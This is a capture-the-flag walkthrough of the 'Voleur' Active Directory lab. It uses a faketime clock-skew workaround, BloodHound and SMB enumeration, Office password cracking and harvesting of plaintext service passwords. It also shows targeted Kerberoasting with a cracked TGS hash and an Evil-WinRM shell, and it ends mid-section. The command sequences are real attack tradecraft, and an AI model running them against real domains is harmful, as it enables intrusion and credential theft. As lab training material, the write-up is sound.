As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: **<font color="red">ryan.naylor</font>** / **<font color="red">HollowOct31Nyt</font>**

---

#  Nmap Scan Notes – `voleur.htb`

**Scan Command:**

```bash
nmap voleur.htb -Pn -sV -sC -T5
```

**Scan Date:** July 9, 2025
**Host:** `voleur.htb (10.10.11.76)`
**Status:** Host is up (0.087s latency)

---

##  Open Ports & Services

| Port     | State | Service       | Version / Notes                                                       |
| -------- | ----- | ------------- | --------------------------------------------------------------------- |
| 53/tcp   | open  | domain        | Generic DNS (SERVFAIL response)                                       |
| 88/tcp   | open  | kerberos-sec  | **Microsoft Windows Kerberos** (server time: 2025-07-10 12:26:45Z)    |
| 135/tcp  | open  | msrpc         | Microsoft Windows RPC                                                 |
| 139/tcp  | open  | netbios-ssn   | Microsoft Windows netbios-ssn                                         |
| 389/tcp  | open  | ldap          | **AD LDAP** (Domain: `voleur.htb0.`, Site: `Default-First-Site-Name`) |
| 445/tcp  | open  | microsoft-ds? | Likely SMB over NetBIOS                                               |
| 464/tcp  | open  | kpasswd5?     | Kerberos password change                                              |
| 593/tcp  | open  | ncacn\_http   | Microsoft Windows RPC over HTTP 1.0                                   |
| 636/tcp  | open  | tcpwrapped    | Typically LDAPS (SSL/TLS encrypted LDAP)                              |
| 2222/tcp | open  | ssh           | OpenSSH 8.2p1 (Ubuntu Linux)                                          |
| 3268/tcp | open  | ldap          | **AD Global Catalog LDAP**                                            |
| 3269/tcp | open  | tcpwrapped    | Typically LDAPS for GC                                                |
| 5985/tcp | open  | http          | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                               |

---

##  Kerberos-Related Observations

| Port               | Role                                                |
| ------------------ | --------------------------------------------------- |
| **88**             | Kerberos Authentication (AS/TGS) – confirms DC role |
| **464**            | Kerberos Password Changes                           |
| **389** / **3268** | LDAP / GC queries post-authentication               |
| **445**            | SMB using Kerberos if domain-joined                 |

* `kerberos-sec` clearly indicates an AD environment using Kerberos.
* Clock skew of **\~8 hours** might cause Kerberos TGT failures if not adjusted locally.

---

##  NSE Script Output (Key Results)

### `smb2-security-mode`:

```
Message signing enabled and required
```

* Confirms domain-enforced SMB signing → cannot be disabled → strong indicator of domain policy

### `smb2-time`:

```
Server date: 2025-07-10T12:27:06Z
Clock skew: 7h59m53s
```

* Ensure local time is synced to avoid Kerberos authentication issues.

---

##  Notes & Follow-ups

*  The host is very likely a **Domain Controller**:

  * Ports 88, 389, 464, 3268 open
  * Hostname in script output is `DC`
*  Begin with Kerberos enumeration:

  * `GetNPUsers.py`, `GetUserSPNs.py`, `Rubeus`, `bloodhound-python`
*  SSH on `2222` is unusual for a Windows machine – likely for pivot or C2 later
*  Message signing required ⇒ cannot use `smbclient` or `rpcclient` without proper signing

---

Here are Markdown notes documenting your use of `impacket-getTGT` with `faketime` to bypass clock skew when generating a Kerberos TGT for the `voleur.htb` domain:

---

#  Kerberos TGT Generation (via Impacket)

##  Context

* The target (`voleur.htb`) has a **clock skew of \~8 hours** ahead of local system time (from earlier `nmap` scan).
* Kerberos authentication is sensitive to clock drift (>5 minutes can break auth).
* Used `faketime` to simulate target time when generating a TGT.

---

##  Command Used

```bash
faketime 'now + 8 hours' impacket-getTGT voleur.htb/ryan.naylor:'HollowOct31Nyt'
```

###  Output:

```
[*] Saving ticket in ryan.naylor.ccache
```

* This command simulates the domain controller's time so that the TGT is considered valid.
* Ticket is saved to `ryan.naylor.ccache`.

---

##  File Created

* `ryan.naylor.ccache` (Kerberos credential cache)
* Location: Current working directory (`~/HTB/Machines/voleur/bloodhound/`)

---

##  Usage of `.ccache` File

You can now use the TGT in other tools that support Kerberos auth:

###  `bloodhound-python`

```bash
bloodhound-python -k --ccache ryan.naylor.ccache -d voleur.htb -c All
```

###  `netexec`

```bash
netexec smb DC.VOLEUR.HTB -k --ccache ryan.naylor.ccache
```

---

##  Notes

* No need to supply `-u` or `-p` when using `--ccache` (ticket handles auth).
* Ensure `/etc/krb5.conf` has the `[realms]` and `[domain_realm]` sections configured for `voleur.htb`.

---

Here are clean and structured **Markdown notes** summarizing what just happened during your `bloodhound-python` execution — including OPSEC-relevant context.

---

#  BloodHound Collection Summary — `voleur.htb`

##  Command Executed

```bash
KRB5CCNAME=ryan.naylor.ccache faketime 'now + 8 hours' bloodhound-python -k -u ryan.naylor -d voleur.htb -c All -ns 10.10.11.76 --disable-autogc
```

### Key Options Used:

* `KRB5CCNAME=ryan.naylor.ccache`: Used pre-obtained Kerberos TGT (no password needed)
* `faketime 'now + 8 hours'`: Corrected local clock skew (\~8hr delta)
* `-k`: Enabled Kerberos auth
* `-u ryan.naylor`: Principal name
* `-d voleur.htb`: Domain
* `-c All`: Performed all available collection methods
* `-ns 10.10.11.76`: Used target DC as DNS server
* `--disable-autogc`: Avoided auto-detection of the global catalog

---

##  BloodHound Output Summary

| Object Type                | Count               |
| -------------------------- | ------------------- |
| Domains                    | 1                   |
| Computers                  | 1 (`DC.voleur.htb`) |
| Users                      | 12                  |
| Groups                     | 56                  |
| Group Policies             | 2                   |
| Organizational Units (OUs) | 5                   |
| Containers                 | 19                  |
| Trusts                     | 0                   |

⏱ **Total Runtime:** 20 seconds
 **Parallelization:** 10 worker threads
 **LDAP Target:** `dc.voleur.htb`

---

##  OPSEC Notes

###  Good Practices:

* **Kerberos auth used**: No plaintext password transmitted (ticket reuse via `.ccache`)
* **Faked system time**: Avoided Kerberos TGT rejection due to DC clock skew
* **Limited DNS exposure**: DNS traffic went only to `10.10.11.76` (target)
* **No NTLM fallback**: Prevented potential hash leaks or logging artifacts

###  Potential OPSEC Risks:

* **LDAP enumeration** (uncredentialed reads are usually benign, but still logged)
* **Kerberos TGT reuse**: If this ticket is compromised or reused improperly, it could raise detection
* **Target DC log noise**: `bloodhound-python` LDAP queries can cause noticeable spikes in AD event logs (event IDs 4662, 5136, 4732, 4769, etc.)

---

##  OPSEC Considerations

* **Kerberos TGT reuse**: If this ticket is compromised or reused improperly, it could raise detection.
* **LDAP enumeration** (uncredentialed reads are usually benign, but still logged): Be cautious when performing LDAP queries to avoid log noise.

---

##  Next Steps

* Import `.json` files into BloodHound GUI for graph analysis
* Look for:

  * `AdminTo` edges (privilege paths)
  * `AddMember`, `GenericAll`, `Owns`, `WriteOwner`, etc.
  * Delegation or unconstrained delegation indicators
  * Kerberoastable SPNs (`GetUserSPNs.py` or in BloodHound)

---

Here’s a polished markdown note entry you can add to your OSCP or HTB notes documenting exactly how you got `bloodhound-python` to successfully collect Active Directory data using a Kerberos TGT — **without explicitly setting `KRB5CCNAME`**:

---

##  BloodHound-python Kerberos Collection (Using Default ccache)

###  Goal

Use a **Kerberos TGT (ticket)** obtained earlier to enumerate Active Directory with `bloodhound-python` **without** setting the `KRB5CCNAME` environment variable manually.

---

###  Steps Taken

1. **Verified existing Kerberos TGT**:

   ```bash
   klist
   ```

   Output:

   ```
   Ticket cache: FILE:/tmp/krb5cc_1000
   Default principal: ryan.naylor@VOLEUR.HTB
   ```

   This confirmed that the TGT was stored in the **default location** `/tmp/krb5cc_1000`, where most tools (including `bloodhound-python`) look by default.

2. **Ran BloodHound-python with faketime and Kerberos auth**:

   ```bash
   faketime 'now + 8 hours' bloodhound-python -k -u ryan.naylor -d voleur.htb -c All -ns 10.10.11.76 --disable-autogc
   ```

3. **Successful output confirmed domain enumeration**:

   ```
   INFO: Found AD domain: voleur.htb
   INFO: Using TGT from cache
   INFO: Found TGT with correct principal in ccache file.
   ...
   INFO: Found 12 users
   INFO: Found 56 groups
   ...
   INFO: Done in 00M 18S
   ```

---

###  Key Insight

As long as your TGT is stored in the default cache file (`/tmp/krb5cc_<UID>`), **you do not need to set `KRB5CCNAME`**. This makes scripting and automation cleaner.

---

###  Bonus Tip

If you're using a `.ccache` file from a different source (e.g., cracked or dumped), just rename or move it:

```bash
mv ryan.naylor.ccache /tmp/krb5cc_1000
```

Then re-run `bloodhound-python` with `-k`.

---

Here’s a clean markdown entry for your OSCP/HTB notes, capturing the successful enumeration of SMB shares using a Kerberos ticket with `netexec`:

---

##  NetExec SMB Share Enumeration via Kerberos TGT

###  Goal

Enumerate SMB shares on the Domain Controller using a **Kerberos ticket** from the local ccache file (no password or hash needed).

---

###  Command Used

```bash
faketime 'now + 8 hours' netexec smb DC.VOLEUR.HTB -k --use-kcache -d voleur.htb --shares
```

---

###  Parameters

| Flag            | Description                                                     |
| --------------- | --------------------------------------------------------------- |
| `faketime`      | Shifts system time forward to match the TGT's validity window   |
| `netexec smb`   | SMB enumeration using NetExec (replacement for CrackMapExec)    |
| `DC.VOLEUR.HTB` | FQDN of the Domain Controller                                   |
| `-k`            | Enables Kerberos authentication                                 |
| `--use-kcache`  | Pulls TGT from local Kerberos ticket cache (`/tmp/krb5cc_1000`) |
| `-d voleur.htb` | Target Active Directory domain                                  |
| `--shares`      | Enumerates available SMB shares                                 |

---

###  Output

```
SMB     DC.VOLEUR.HTB  445  DC  [*] x64 (name:DC) (domain:VOLEUR.HTB) (signing:True) (SMBv1:False) (NTLM:False)
SMB     DC.VOLEUR.HTB  445  DC  [+] voleur.htb\ryan.naylor from ccache 
SMB     DC.VOLEUR.HTB  445  DC  [*] Enumerated shares
SMB     DC.VOLEUR.HTB  445  DC  Share        Permissions   Remark
SMB     DC.VOLEUR.HTB  445  DC  -----        -----------   ------
SMB     DC.VOLEUR.HTB  445  DC  ADMIN$                     Remote Admin
SMB     DC.VOLEUR.HTB  445  DC  C$                         Default share
SMB     DC.VOLEUR.HTB  445  DC  Finance                   
SMB     DC.VOLEUR.HTB  445  DC  HR                        
SMB     DC.VOLEUR.HTB  445  DC  IPC$         READ          Remote IPC
SMB     DC.VOLEUR.HTB  445  DC  IT           READ          
SMB     DC.VOLEUR.HTB  445  DC  NETLOGON     READ          Logon server share
SMB     DC.VOLEUR.HTB  445  DC  SYSVOL       READ          Logon server share
```

---

###  Notes

* **Authentication worked seamlessly** using the Kerberos TGT already stored in the cache.
* **SMB Signing is enabled** but not enforced (`signing:True`), and **SMBv1 is disabled**, which is typical in hardened environments.
* Shares like `SYSVOL`, `NETLOGON`, and `IT` are accessible — useful for:

  * Group Policy abuse
  * Finding plaintext creds or scripts
  * Pivoting via PSExec or other SMB-based techniques

---
Here's a Markdown-formatted summary of your `smbclient` usage with `faketime`:

---

##  SMBClient Access with `faketime`

###  Command Used

```bash
faketime 'now + 8 hours' smbclient //DC.VOLEUR.HTB/IT -U ryan.naylor -W VOLEUR.HTB -d 3
```

###  Purpose

* **`faketime 'now + 8 hours'`**: Temporarily manipulates the system time for the `smbclient` process, often useful to bypass time-based restrictions (e.g., Kerberos ticket validity or account enablement windows).
* **`smbclient`**: Connects to the SMB share `\\DC.VOLEUR.HTB\IT` as user `ryan.naylor` under the domain `VOLEUR.HTB`.
* **`-d 3`**: Enables debug level 3 output to assist with troubleshooting or verbose session logging.

---

###  Key Output Details

####  Network Interfaces Added:

* Multiple interfaces including `eth0`, `wlan0`, `docker0`, `br-*` detected with IPv6 and IPv4.
* Example IPs:

  * `192.168.1.240` (eth0)
  * `172.17.0.1` (docker0)
  * `fd5e:31d4:15be::318` (IPv6)

####  Permission Warnings:

```plaintext
directory_create_or_exist: mkdir failed on directory /run/samba: Permission denied
```

* These are non-fatal but indicate the process lacked permission to create temp directories (can be ignored unless writing to shared locations).

####  Connection Details:

* Attempted connections to:

  * `10.10.11.76:445`
  * `10.10.11.76:139`
* SMB GENSEC backends loaded:

  * `ntlmssp`, `spnego`, `krb5`, `schannel`, etc.

---

###  Authentication

Prompted for password for user:

```
VOLEUR.HTB\ryan.naylor
```

---

###  Directory Listing (`ls`)

Inside the share `\\DC.VOLEUR.HTB\IT`:

| Name                 | Type | Size | Last Modified            |
| -------------------- | ---- | ---- | ------------------------ |
| `.`                  | Dir  | 0    | Wed Jan 29 01:10:01 2025 |
| `..`                 | DHS  | 0    | Mon Jun 30 14:08:33 2025 |
| `First-Line Support` | Dir  | 0    | Wed Jan 29 01:40:17 2025 |

* **Filesystem Blocks:**

  * Total: `5311743` blocks of 4KB
  * Free: `897980` blocks

---

###  Takeaways

* Time manipulation successfully enabled access.
* Directory contents appear accessible.
* Useful for browsing or downloading sensitive documents when access is time-gated.

---

Here’s a clean, OSCP-style markdown note for using `smbclient` to recursively download a folder from an SMB share — including the prompt behavior for `mget`.

---

##  SMBClient Recursive File Download (Folder or Directory)

###  Tool

`smbclient` – Interactive SMB share access (like FTP)

---

###  Scenario

You have accessed a share like `\\dc.voleur.htb\IT` and want to download all files from a subdirectory (e.g., `"First-Line Support"`).

---

###  Command Flow

```bash
smbclient //dc.voleur.htb/IT -U 'voleur.htb\ryan.naylor'
```

Inside the interactive prompt:

```smb
smb: \> recurse ON        # Enables recursive directory traversal
smb: \> prompt OFF        # Disables individual file confirmation prompts
smb: \> mget "First-Line Support/*"
```

---

###  What It Does

* `recurse ON`: Ensures subdirectories are processed.
* `prompt OFF`: Skips asking "Get file XYZ?" for every file.
* `mget "First-Line Support/*"`: Downloads all files inside the folder.

If you forget to disable `prompt`, you’ll see:

```smb
smb: \> mget "First-Line Support/*"
Get file Access_Review.xlsx? 
```

You’d have to confirm with `y` or `n` for each.

---

###  Pro Tip

If you're scripting or automating:

```bash
smbclient //dc.voleur.htb/IT -U 'voleur.htb\ryan.naylor' -c 'recurse; prompt; mget "First-Line Support/*"'
```
Perfect — you're right on track. You’ve successfully extracted the password hash from a Microsoft Excel 2013 file using `office2john`. Now here’s a clean markdown note and final steps for cracking it with `john`.

---

##  Cracking Excel 2013 Password with John the Ripper

###  Target File

`Access_Review.xlsx` (password-protected Microsoft Excel file)

---

###  Step-by-Step Process

###  Step 1: Extract Hash

```bash
office2john.py Access_Review.xlsx > hash.txt
```

This produces a hash in the `$office$*2013*...` format:

```
$office$*2013*100000*256*16*a80811...111c
```

---

###  Step 2: Identify Hash Type (optional)

```bash
hashid hash.txt
```

Output:

```
[+] Microsoft Office 2013
```

Confirms the format is correct and supported.

---

###  Step 3: Crack Hash with John

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Or use another custom wordlist:

```bash
john --wordlist=custom.lst hash.txt
```

---

###  Step 4: Display Cracked Password

```bash
john --show hash.txt
```

Example output:

```
Access_Review.xlsx:$office$*2013*...:Spring2023
```

---

Here's a concise and structured **Markdown note** summarizing your successful `john` cracking session:

---

##  John the Ripper Notes – Cracking MS Office Hash

###  Command Used

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

---

###  Hash Info

* **Hash Type**: Microsoft Office 2007/2010/2013
* **Detected Format**: `Office, 2007/2010/2013`
* **Cracking Engine**: AVX2 (SHA1/SHA512 with AES)
* **MS Office Version**: 2013
* **PBKDF2 Iteration Count**: 100,000

---

###  Execution Details

* **Threads Used**: 48 OpenMP threads
* **Encoding**: UTF-8
* **Wordlist Used**: `rockyou.txt`

---

###  Cracked Password

| Username | Password    |
| -------- | ----------- |
| ?        | `football1` |

> Display with:

```bash
john hash --show
```

---

###  Performance

* **Speed**: \~0.6493 guesses per second
* **Progress**: 1 password guessed in 1 second
* **Examples tried**: `football1..summer1`

---

###  Notes

* No username associated (`?` shown).
* Cracking success indicates good match with weak/common password list.
* Office 2013 uses PBKDF2 + AES encryption, \~100k iterations.

---


Here's a Markdown version of the full table and notes extracted from your image and text:

---

##  User Accounts

| **User**       | **Job Title**                  | **Permissions**         | **Notes**                                                               |
| -------------- | ------------------------------ | ----------------------- | ----------------------------------------------------------------------- |
| Ryan.Naylor    | First-Line Support Technician  | SMB                     | Has Kerberos Pre-Auth disabled temporarily to test legacy systems.      |
| Marie.Bryant   | First-Line Support Technician  | SMB                     |                                                                         |
| Lacey.Miller   | Second-Line Support Technician | Remote Management Users |                                                                         |
| ~~Todd.Wolfe~~ | Second-Line Support Technician | Remote Management Users | Leaver. Password was reset to `NightT1meP1dg3on14` and account deleted. |
| Jeremy.Combs   | Third-Line Support Technician  | Remote Management Users | Has access to Software folder.                                          |
| Administrator  | Administrator                  | Domain Admin            | Not to be used for daily tasks!                                         |

---

##  Service Accounts

| **Account**  | **Purpose**        | **Notes / Passwords**                         |
| ------------ | ------------------ | --------------------------------------------- |
| `svc_backup` | Windows Backup     | Speak to Jeremy!                              |
| `svc_ldap`   | LDAP Services      | P/W – `M1XyC9pW7qT5Vn`                        |
| `svc_iis`    | IIS Administration | P/W – `N5pXyW1VqM7CZ8`                        |
| `svc_winrm`  | Remote Management  | Need to ask Lacey as she reset this recently. |

---

![Users](/Images/voleur/svc_ldap_to_restore_users.png)


```bash
$ faketime 'now + 8 hours' bloodyAD -d voleur.htb --host DC.voleur.htb --dc-ip 10.10.11.76 -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k  set object 'svc_winrm' servicePrincipalName
[+] svc_winrm's servicePrincipalName has been updated
```
Here's a clear Markdown-formatted explanation of your provided command and its successful output:

---

###  **Setting a Service Principal Name (SPN) using `bloodyAD` and Kerberos**

**Command Executed:**

```bash
KRB5CCNAME=/tmp/krb5cc_1000 faketime 'now + 8 hours' bloodyAD \
  --host DC.voleur.htb \
  --dc-ip 10.10.11.76 \
  -d voleur.htb \
  -u svc_ldap -k \
  set object svc_winrm servicePrincipalName -v 'NetSec/DeadSecOps'
```

---

###  **Parameter Breakdown:**

| Parameter                     | Explanation                                                      |
| ----------------------------- | ---------------------------------------------------------------- |
| `KRB5CCNAME=/tmp/krb5cc_1000` | Use the specified Kerberos ticket cache (`svc_ldap` ticket).     |
| `faketime 'now + 8 hours'`    | Adjust local time by +8 hours to match domain controller's time. |
| `bloodyAD`                    | Tool for Active Directory object manipulation.                   |
| `--host DC.voleur.htb`        | Domain Controller's Fully Qualified Domain Name (FQDN).          |
| `--dc-ip 10.10.11.76`         | Domain Controller's IP address.                                  |
| `-d voleur.htb`               | Domain name you're targeting.                                    |
| `-u svc_ldap`                 | User performing the action (`svc_ldap`).                         |
| `-k`                          | Authenticate using Kerberos (from ticket cache).                 |
| `set object svc_winrm`        | Target AD object (`svc_winrm`) to modify.                        |
| `servicePrincipalName`        | Attribute being set on the target account.                       |
| `-v 'NetSec/DeadSecOps'`      | The SPN value you're assigning.                                  |

---

### **Successful Output:**

```
[+] svc_winrm's servicePrincipalName has been updated
```

This confirms you have successfully updated the `svc_winrm` account by assigning it the SPN:

* **`NetSec/DeadSecOps`**

---

Here's your clear Markdown-formatted notes based on the provided successful **Kerberoasting attack**:

---

##  Kerberoasting Attack Notes (Voleur.htb)

###  Objective

Perform **Targeted Kerberoasting** against the `svc_winrm` account to obtain a hash for offline cracking.

---

###  Initial Command (using Impacket):

```bash
KRB5CCNAME=/tmp/krb5cc_1000 faketime 'now + 8 hours' impacket-GetUserSPNs voleur.htb/svc_ldap -k -no-pass -dc-ip 10.10.11.76 -request -dc-host DC.voleur.htb
```

* **Kerberos Authentication**: Used pre-obtained Kerberos TGT (`svc_ldap`).
* **faketime**: Adjusted local time to avoid issues due to clock skew.
* **SPN Requested**: `NetSec/DeadSecOps`

---

###  Results:

| Service Principal Name | User       | Group Membership        | Password Last Set         | Last Logon                |
| ---------------------- | ---------- | ----------------------- | ------------------------- | ------------------------- |
| `NetSec/DeadSecOps`    | svc\_winrm | Remote Management Users | 2025-01-31 01:10:12 (UTC) | 2025-01-29 07:07:32 (UTC) |

---

###  Obtained Kerberos TGS Hash (`svc_winrm`):

```plaintext
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$cebaa4c8d1229f91168f6753957bbb17$343164b458b1885d83bca1df38602ec12284514e8e14b4f7934bece0bbf4c6a6c7d26da4c0d9310c0d8545019a25d4f9abbcc6bc07bc37c8343476deb7ec6c398468d4a37f2ab2d6d8ebbd4f6975a1a558b4e418aa49bc7ba9c62a676c95e63d1699b5aed210b83006abc9e88a6e4b65660cfde0fef83dafdfdcfc88d39a6e687872cf55f8b34c43b9beefa6c313411c09c3c17ada7326cb5f6726234402e7988065b9dc1c1554231eeca1a848b06b9df3861072ce7e2ae838d105a948bb1b194fe2e9f61d04438cf0517181aa0ebb4973aeb20eb96518647c54daab40a8ec83d31c75bc31d3f9d6646ee05d97aaa075cbc326a489c14863c9302add645acc67b54e018388a01d456fb227068bd44afc14b41c7257f20fb5bba3dc08306a8912b34e127a17aac89a84c8ba03c343d6a0f6d897e717bcd0a7f3ca591b561e24e348101a3e527486e1a3928b080313195207e7e9aba339018d75ee8551a7a1f91d5b969836aa9a46d17b946549772bc0676c937151a0d711c5811fcac0df7d2ffe0e62c5858254569d7cf0d3ba5ba0402ef222ba891f5074c22c28ab156d6f475bb61b6a1fe7666a1422e9e8148192a84936c91b0fd9d0cda8c3cc79b723b81a2a361191b02cdb31b97d9fd9f8aa67b5b3244207d2779de6594a0ee4babbab36910e86bca30747645ca1526cd256571a45bb52f08c948ec5f5ad8256b2b815ef9c6c546de49a11fc8fa7c1716715a2658578d1c839387ebc9457591130089360d4adadc3276f86bf4b91e1de68e11e764ef03cc8d007fec54f3bcbc66c5f9f931c95dd63693d30d0920891d698a5e1c727e8d2d9345490ea048e61b9b871893e9015088d438dcfc005a44f1a1a07958bfa9cd2d0fef77eaeee8fb41e10ca16dddd9d1c6c24335dcefe0811bf37977e7788970c95caa9fed73b1bc05a5500b5739c87bfdfa30591f1b8b5c7ca895b7f678f1c3c450838b364228222b5d43eda52012a999d62234adc7c89781981444f60a8f9a7edd9374fe2c0c3927e5bb16f89699cb8a48d757cb63da1a6f41ae21cc7f5f5468267bd2ed61ebac083589a876f21ef593901264c65a4d8ba238622e9d348468f38516eb31b21157c4ac537a877e499d53c5dad18bc3c559e33b98da9c0ddd452ed29b80e2bbc76ce2e7514d07072345e56dc22c8e8dc33acee56a561577333a454a33bafd3f33f097da53b13e9a956812f1758823f76beb55b8884ed93a47d5744fc8ffa279f6e9ff9c7f4c7d3ad47b87089ae0ca7c829608584351565b0e68b3ed38b5cf55cb83a4709e541eb2f40a986d642da45a3b5ef3d506996c7324bcf58811d5626a629f3cfa15d8d1962eea06e4c3602fa2e98d2590ef37be185ce8656a06b275c8cb96b6e996e895aa9fe15201018e5f5577275c0abcb86b1725abed26b5b8ca71b4faf1b2cd24a2563f33603156ae64fccdab3cee0fceef6ee0779df
```

---

###  Next Steps:

* **Crack**:

```bash
$ hashcat -a 0 krbtgs.hash /usr/share/wordlists/rockyou.txt  
hashcat (v6.2.6-1184-g5ffbc5edc) starting in autodetect mode

HIP API (HIP 6.4.43483)
=======================
* Device #01: AMD Radeon RX 6900 XT, 16244/16368 MB, 40MCU

OpenCL API (OpenCL 2.1 AMD-APP (3649.0)) - Platform #1 [Advanced Micro Devices, Inc.]
=====================================================================================
* Device #02: AMD Radeon RX 6900 XT, skipped

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
====================================================================================================================================================
* Device #03: cpu-haswell-AMD Ryzen Threadripper 2970WX 24-Core Processor, skipped

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 863 MB (74860 MB free)

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$cebaa4c8d1229f91168f6753957bbb17$343164b458b1885d83bca1df38602ec12284514e8e14b4f7934bece0bbf4c6a6c7d26da4c0d9310c0d8545019a25d4f9abbcc6bc07bc37c8343476deb7ec6c398468d4a37f2ab2d6d8ebbd4f6975a1a558b4e418aa49bc7ba9c62a676c95e63d1699b5aed210b83006abc9e88a6e4b65660cfde0fef83dafdfdcfc88d39a6e687872cf55f8b34c43b9beefa6c313411c09c3c17ada7326cb5f6726234402e7988065b9dc1c1554231eeca1a848b06b9df3861072ce7e2ae838d105a948bb1b194fe2e9f61d04438cf0517181aa0ebb4973aeb20eb96518647c54daab40a8ec83d31c75bc31d3f9d6646ee05d97aaa075cbc326a489c14863c9302add645acc67b54e018388a01d456fb227068bd44afc14b41c7257f20fb5bba3dc08306a8912b34e127a17aac89a84c8ba03c343d6a0f6d897e717bcd0a7f3ca591b561e24e348101a3e527486e1a3928b080313195207e7e9aba339018d75ee8551a7a1f91d5b969836aa9a46d17b946549772bc0676c937151a0d711c5811fcac0df7d2ffe0e62c5858254569d7cf0d3ba5ba0402ef222ba891f5074c22c28ab156d6f475bb61b6a1fe7666a1422e9e8148192a84936c91b0fd9d0cda8c3cc79b723b81a2a361191b02cdb31b97d9fd9f8aa67b5b3244207d2779de6594a0ee4babbab36910e86bca30747645ca1526cd256571a45bb52f08c948ec5f5ad8256b2b815ef9c6c546de49a11fc8fa7c1716715a2658578d1c839387ebc9457591130089360d4adadc3276f86bf4b91e1de68e11e764ef03cc8d007fec54f3bcbc66c5f9f931c95dd63693d30d0920891d698a5e1c727e8d2d9345490ea048e61b9b871893e9015088d438dcfc005a44f1a1a07958bfa9cd2d0fef77eaeee8fb41e10ca16dddd9d1c6c24335dcefe0811bf37977e7788970c95caa9fed73b1bc05a5500b5739c87bfdfa30591f1b8b5c7ca895b7f678f1c3c450838b364228222b5d43eda52012a999d62234adc7c89781981444f60a8f9a7edd9374fe2c0c3927e5bb16f89699cb8a48d757cb63da1a6f41ae21cc7f5f5468267bd2ed61ebac083589a876f21ef593901264c65a4d8ba238622e9d348468f38516eb31b21157c4ac537a877e499d53c5dad18bc3c559e33b98da9c0ddd452ed29b80e2bbc76ce2e7514d07072345e56dc22c8e8dc33acee56a561577333a454a33bafd3f33f097da53b13e9a956812f1758823f76beb55b8884ed93a47d5744fc8ffa279f6e9ff9c7f4c7d3ad47b87089ae0ca7c829608584351565b0e68b3ed38b5cf55cb83a4709e541eb2f40a986d642da45a3b5ef3d506996c7324bcf58811d5626a629f3cfa15d8d1962eea06e4c3602fa2e98d2590ef37be185ce8656a06b275c8cb96b6e996e895aa9fe15201018e5f5577275c0abcb86b1725abed26b5b8ca71b4faf1b2cd24a2563f33603156ae64fccdab3cee0fceef6ee0779df:AFireInsidedeOzarctica980219afi
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_wi...0779df
Time.Started.....: Fri Jul 11 23:03:23 2025 (1 sec)
Time.Estimated...: Fri Jul 11 23:03:24 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........: 20397.9 kH/s (7.67ms) @ Accel:1024 Loops:1 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 11796480/14344385 (82.24%)
Rejected.........: 0/11796480 (0.00%)
Restore.Point....: 10485760/14344385 (73.10%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: XiaoNianNian -> 8205367914
Hardware.Mon.#01.: Temp: 56c Fan: 14% Util: 57% Core:2600MHz Mem:1000MHz Bus:16

Started: Fri Jul 11 23:03:09 2025
Stopped: Fri Jul 11 23:03:25 2025
```
**Password for <span style="color:red">svc_winrm</span> :: <span style="color:red">AFireInsidedeOzarctica980219afi</span>**

# Evil-WinRM Session Exploitation Notes

## Establish Evil-WinRM Session

```bash
# Get Kerberos ticket for svc_winrm
kinit svc_winrm@VOLEUR.HTB 
Password for svc_winrm@VOLEUR.HTB: 

# Use Evil-WinRM to connect
evil-winrm -i dc.voleur.htb -u svc_winrm -p 'AFireInsidedeOzarctica980219afi' -r VOLEUR.HTB
```

**Successful Connection:**

```
Evil-WinRM shell v3.7
Warning: Remote path completions disabled due to Ruby limitation.
Warning: User and Password not required due to Kerberos auth (ticket-based).
```

## Enumerate User Directories

Navigate and list directories:

```powershell
PS C:\Users\svc_winrm\Documents> cd ..
PS C:\Users\svc_winrm> ls
```

**User directories discovered:**

* 3D Objects
* Contacts
... Snipped ...
* Saved Games
* Searches
* Videos

## Retrieve user.txt

Navigate to Desktop and list files:

```powershell
PS C:\Users\svc_winrm> cd Desktop
PS C:\Users\svc_winrm\Desktop> ls
```

File discovered:

* `user.txt`

Extract the user flag:

```powershell
PS C:\Users\svc_winrm\Desktop> cat user.txt
```

**User flag obtained:**

```
4f34404cdfc585f247eb95b361ee3ba4
```

---

## Next Steps

* Enumerate further privileges.
* Attempt privilege escalation methods.
* Continue searching for sensitive data or further credentials.

![svc_ldap to lacey miller](/Images/voleur/generic-write-lacey.png)

# AS-REP Roasting LACEY.MILLER
You should use this command:

```bash
